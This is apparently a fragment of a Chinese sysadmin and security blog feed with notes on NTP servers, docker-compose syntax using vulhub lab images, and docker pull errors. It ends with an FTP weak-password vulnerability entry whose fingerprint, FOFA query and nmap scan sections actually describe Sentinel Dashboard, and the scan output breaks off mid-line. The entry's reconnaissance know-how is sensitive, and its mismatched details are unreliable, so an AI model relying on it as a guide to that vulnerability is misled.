      
      <category>ddos</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>ddos</tag>
      
      <tag>udpflood</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ntp_domain</title>
    <link href="/2024/03/08/yunwei/applications/ntp/ntp_domain/"/>
    <url>/2024/03/08/yunwei/applications/ntp/ntp_domain/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="常见ntp服务域名"><a href="#常见ntp服务域名" class="headerlink" title="常见ntp服务域名"></a>常见ntp服务域名</h1><h2 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><table><thead><tr><th align="left">经典网络内网</th><th align="left">专有网络VPC内网</th><th align="left">公网</th></tr></thead><tbody><tr><td align="left">-</td><td align="left">ntp.cloud.aliyuncs.com</td><td align="left">ntp.aliyun.com</td></tr><tr><td align="left">ntp1.cloud.aliyuncs.com</td><td align="left">ntp7.cloud.aliyuncs.com</td><td align="left">ntp1.aliyun.com</td></tr><tr><td align="left">ntp2.cloud.aliyuncs.com</td><td align="left">ntp8.cloud.aliyuncs.com</td><td align="left">ntp2.aliyun.com</td></tr><tr><td align="left">ntp3.cloud.aliyuncs.com</td><td align="left">ntp9.cloud.aliyuncs.com</td><td align="left">ntp3.aliyun.com</td></tr><tr><td align="left">ntp4.cloud.aliyuncs.com</td><td align="left">ntp10.cloud.aliyuncs.com</td><td align="left">ntp4.aliyun.com</td></tr><tr><td align="left">ntp5.cloud.aliyuncs.com</td><td align="left">ntp11.cloud.aliyuncs.com</td><td align="left">ntp5.aliyun.com</td></tr><tr><td align="left">ntp6.cloud.aliyuncs.com</td><td align="left">ntp12.cloud.aliyuncs.com</td><td align="left">ntp6.aliyun.com</td></tr><tr><td align="left">-</td><td align="left">-</td><td align="left">ntp7.aliyun.com</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>ntp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>ntp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_compose</title>
    <link href="/2024/03/07/yunwei/applications/docker/docker_compose/"/>
    <url>/2024/03/07/yunwei/applications/docker/docker_compose/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>项目（project）由一组关联的应用容器组成一个完整业务单元</p><p>服务（service）一个应用容器</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><p>指定yml基于的docker-compose版本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">version</span>: &#x27;<span class="hljs-number">2</span>.<span class="hljs-number">3</span>&#x27;<br></code></pre></td></tr></table></figure><h3 id="services"><a href="#services" class="headerlink" title="services"></a>services</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">services</span>:<br>  <span class="hljs-attribute">redis</span>:<br>    <span class="hljs-attribute">image</span>: redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">9</span>-alpine<br></code></pre></td></tr></table></figure><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>指定容器运行的镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">image</span>: redis<br><span class="hljs-attribute">image</span>: ubuntu:<span class="hljs-number">14</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">image</span>: example-registry.com:<span class="hljs-number">4000</span>/postgresql<br><span class="hljs-attribute">image</span>: a4bc65fd # 镜像id<br><span class="hljs-attribute">image</span>: vulhub/airflow:<span class="hljs-number">1</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h3><p>添加环境变量，值可以为数组、字典或布尔值，布尔值需要使用引号，否则YML解析器转换为 True 或 False</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">postgresql</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres:12-alpine</span><br>  <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=gitlab</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=password</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  docker docker-compose <span class="hljs-keyword">up</span> <br>Creating network <span class="hljs-string">&quot;docker_default&quot;</span> with the default driver<br>Pulling pgsql (postgre<span class="hljs-variable">s:12</span>-alpine)...<br><span class="hljs-number">12</span>-alpine: Pulling from library/postgres<br><span class="hljs-number">9</span>b18e9b68314: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">75</span>aada9edfc5: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">820773693750</span>: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">83</span>dc43929537: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">92</span>e2c19af124: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">52</span>f242e5c209: Pull <span class="hljs-built_in">complete</span><br>e0a8c8565c42: Pull <span class="hljs-built_in">complete</span><br>a424ab832487: Pull <span class="hljs-built_in">complete</span><br>Digest: <span class="hljs-built_in">sha256</span>:<span class="hljs-number">55</span>fb7ba926381c2ac1f8f58bb181dd932f140aa467c3097a07c6815648dbc5e2<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> postgre<span class="hljs-variable">s:12</span>-alpine<br>Creating docker_pgsql_1 ... done<br>Attaching <span class="hljs-keyword">to</span> docker_pgsql_1<br><br>➜  ~ docker <span class="hljs-keyword">ps</span><br>CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS          PORTS      NAMES<br><span class="hljs-number">34264</span>c6a3d67   postgre<span class="hljs-variable">s:12</span>-alpine   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">55</span> seconds ago   Up <span class="hljs-number">54</span> seconds   <span class="hljs-number">5432</span>/tcp   docker_pgsql_1<br><br></code></pre></td></tr></table></figure><h3 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a>depends_on</h3><p>设置依赖关系</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.</span><br>    <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">db</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres</span><br></code></pre></td></tr></table></figure><p>docker-compose up：按照依赖关系启动服务，例如：先启动db和redis，再启动web，但是并不是说必须等db和redis启动完成再启动web</p><p>docker-compose up SERVICE：自动包含指定SERVER的依赖项</p><p>docker-compose stop ：按照依赖关系停止服务</p><h3 id="ports"><a href="#ports" class="headerlink" title="ports"></a>ports</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">gitlab</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">vulhub/gitlab:13.10.1</span><br>  <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">postgresql</span><br>  <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:80&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;10022:22&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;443&quot;</span><br></code></pre></td></tr></table></figure><p>绑定容器的8080到主机的80</p><p>绑定容器的443到主机的任意端口，取决于容器启动时的随机端口</p><h3 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a>volumes</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">postgresql</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres:11.9-alpine</span><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=gitlab</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=password</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=gitlabhq_production</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">DB_EXTENSION=pg_trgm</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">./load-extensions.sh:/docker-entrypoint-initdb.d/load-extensions.sh</span><br></code></pre></td></tr></table></figure><p>主机文件或数据卷挂载到容器中</p><h3 id="command"><a href="#command" class="headerlink" title="command"></a>command</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">namenode</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">vulhub/hadoop:2.8.1</span><br>  <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">HDFS_CONF_dfs_namenode_name_dir=file:///hadoop/dfs/name</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">CLUSTER_NAME=vulhub</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">HDFS_CONF_dfs_replication=1</span><br>  <span class="hljs-attribute">command</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/namenode.sh</span><br></code></pre></td></tr></table></figure><p>覆盖容器启动的默认命令</p><h3 id="healthcheck"><a href="#healthcheck" class="headerlink" title="healthcheck"></a>healthcheck</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">healthcheck:</span><br><span class="hljs-symbol">  test:</span> [<span class="hljs-string">&quot;CMD&quot;</span>, <span class="hljs-string">&quot;pg_isready&quot;</span>, <span class="hljs-string">&quot;-U&quot;</span>, <span class="hljs-string">&quot;airflow&quot;</span>] <span class="hljs-meta">#设置检查程序</span><br><span class="hljs-symbol">  interval:</span> <span class="hljs-number">1</span>m5s <span class="hljs-meta">#设置检测间隔</span><br><span class="hljs-symbol">  retries:</span> <span class="hljs-number">5</span> <span class="hljs-meta">#设置重试次数</span><br><span class="hljs-symbol">  timeout:</span> <span class="hljs-number">10</span> <span class="hljs-meta">#设置超时时间</span><br><span class="hljs-symbol">  start_period:</span> <span class="hljs-number">1</span>m40s <span class="hljs-meta">#设置程序启动多久后开始检测</span><br></code></pre></td></tr></table></figure><h3 id="container-name"><a href="#container-name" class="headerlink" title="container_name"></a>container_name</h3><p>指定容器名称，而非默认生成的名称</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">container_name: <span class="hljs-keyword">my</span>-container<br></code></pre></td></tr></table></figure><h3 id="devices"><a href="#devices" class="headerlink" title="devices"></a>devices</h3><p>指定设备映射列表</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">devices:</span> <br>    - <span class="hljs-string">&quot;/dev/ttyUSB0:/dev/ttyUSB0&quot;</span><br></code></pre></td></tr></table></figure><h3 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h3><p>自定义DNS服务器，可以为单个值，也可以为列表</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">dns</span><span class="hljs-punctuation">:</span> <span class="hljs-string">8.8.8.8</span><br><br><span class="hljs-attribute">dns</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">8.8.8.8</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">114.114.114.114</span><br></code></pre></td></tr></table></figure><h3 id="dns-search"><a href="#dns-search" class="headerlink" title="dns_search"></a>dns_search</h3><p>自定义DNS搜索域，可以为单个值，也可以为列表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dns_search: ns1<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span><br><br>dns_search: <br>    - ns2<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span><br>    - ns3<span class="hljs-selector-class">.test</span>.com<br></code></pre></td></tr></table></figure><h3 id="env-file"><a href="#env-file" class="headerlink" title="env_file"></a>env_file</h3><p>从文件中添加环境变量</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">env_file</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.env</span><br><br><span class="hljs-attribute">env_file</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">envfile2.env</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">./envfile3.env</span><br><br></code></pre></td></tr></table></figure><h3 id="expose"><a href="#expose" class="headerlink" title="expose"></a>expose</h3><p>暴露端口，但不映射到宿主机，也就是说只有内部可使用</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">expose:</span> <br>    - <span class="hljs-string">&quot;3333&quot;</span><br>    - <span class="hljs-string">&quot;6666&quot;</span><br></code></pre></td></tr></table></figure><h3 id="extra-hosts"><a href="#extra-hosts" class="headerlink" title="extra_hosts"></a>extra_hosts</h3><p>添加主机名映射，在容器&#x2F;etc&#x2F;hosts中创建主机名和IP绑定关系</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">extra_hosts:</span> <br>     - <span class="hljs-string">&quot;newhost:1.1.1.1&quot;</span><br>     - <span class="hljs-string">&quot;oldhost:2.2.2.2&quot;</span><br></code></pre></td></tr></table></figure><h3 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h3><p>服务日志记录配置</p><p>di r</p><h3 id="build"><a href="#build" class="headerlink" title="build"></a>build</h3><p>指定镜像构建上下文路径</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_error</title>
    <link href="/2024/03/07/yunwei/applications/docker/docker_error/"/>
    <url>/2024/03/07/yunwei/applications/docker/docker_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="docker-pull-error"><a href="#docker-pull-error" class="headerlink" title="docker pull error"></a>docker pull error</h1><h2 id="image-name-error"><a href="#image-name-error" class="headerlink" title="image name error"></a>image name error</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) root@localhost:~# docker pull gitlab-ce/gitlab-ce:14.9.1<br><span class="hljs-keyword">Error </span>response from daemon: pull access denied for gitlab-ce/gitlab-ce, repository does not exist or may require &#x27;docker login&#x27;: denied: requested access to the resource is denied<br></code></pre></td></tr></table></figure><p>因为镜像名称写错导致报错，正确镜像名称gitlab&#x2F;gitlab-ce</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker search gitlab-ce</span><br><span class="hljs-title class_">NAME</span>                                     <span class="hljs-title class_">DESCRIPTION</span>                                     <span class="hljs-title class_">STARS</span>     <span class="hljs-title class_">OFFICIAL</span>   <span class="hljs-title class_">AUTOMATED</span><br>gitlab/gitlab-ce                         <span class="hljs-title class_">GitLab</span> <span class="hljs-title class_">Community</span> <span class="hljs-title class_">Edition</span> docker image based …   <span class="hljs-number">3592</span>                 [<span class="hljs-title class_">OK</span>]<br><br></code></pre></td></tr></table></figure><h2 id="image-tag-error"><a href="#image-tag-error" class="headerlink" title="image tag error"></a>image tag error</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) root@localhost:~# docker pull gitlab/gitlab-ce:14.9.1<br><span class="hljs-keyword">Error </span>response from daemon: manifest for gitlab/gitlab-ce:14.9.1 not found: manifest unknown: manifest unknown<br><br></code></pre></td></tr></table></figure><p>因为镜像版本号不对导致报错，需要正确版本号</p><p>如何确认正常版本号</p><p>登录docker hub <a href="https://hub.docker.com/u/library">https://hub.docker.com/u/library</a> 搜索对应的镜像</p><p>复制提供的命令即可正确下载</p><p><a href="https://blog.csdn.net/ichen820/article/details/114536044">https://blog.csdn.net/ichen820/article/details/114536044</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iotop</title>
    <link href="/2024/03/04/yunwei/commands/iotop/"/>
    <url>/2024/03/04/yunwei/commands/iotop/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ftp_weak_password</title>
    <link href="/2024/03/04/security/secvulns/ftp/ftp_weak_password/"/>
    <url>/2024/03/04/security/secvulns/ftp/ftp_weak_password/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h3><p>ftp弱口令</p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>ftp服务存在弱口令</p><h3 id="漏洞级别"><a href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h3><p>高危</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1、禁止将ftp&#x2F;sftp服务暴露在公网</p><p>2、设置强口令，包含数字、大小写字母、特殊字符，长度10位以上</p><p>3、设置访问来源IP限制</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a>默认信息</h4><p>默认端口 21（TCP）</p><h4 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h4><p>title：Sentinel Dashboard</p><h4 id="服务查询"><a href="#服务查询" class="headerlink" title="服务查询"></a>服务查询</h4><h5 id="fofa-info"><a href="#fofa-info" class="headerlink" title="fofa.info"></a>fofa.info</h5><p>“title: Sentinel Dashboard”</p><h5 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h5><p>nmap -A 进行探测 ，SERVER 为 http-proxy ，页面中包含 “Sentinel Dashboard”</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs wren">➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">A</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-number">8080</span>   <br><span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span> ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-02-23 10:50 CST</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-title function_">localhost</span> (<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>)<br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.00026</span>s <span class="hljs-variable">latency</span>).<br><br><span class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>    <span class="hljs-variable">VERSION</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">favicon</span>: <span class="hljs-title class_">Spring</span> <span class="hljs-title class_">Java</span> <span class="hljs-title class_">Framework</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">FourOhFourRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">sentinel_dashboard_cookie</span><span class="hljs-operator">=</span><span class="hljs-variable">BE654F45DE66F950E0710F8070194DEE</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">GetRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Last</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">22</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Accept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>: <span class="hljs-variable">bytes</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>: <span class="hljs-variable">zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">901</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title 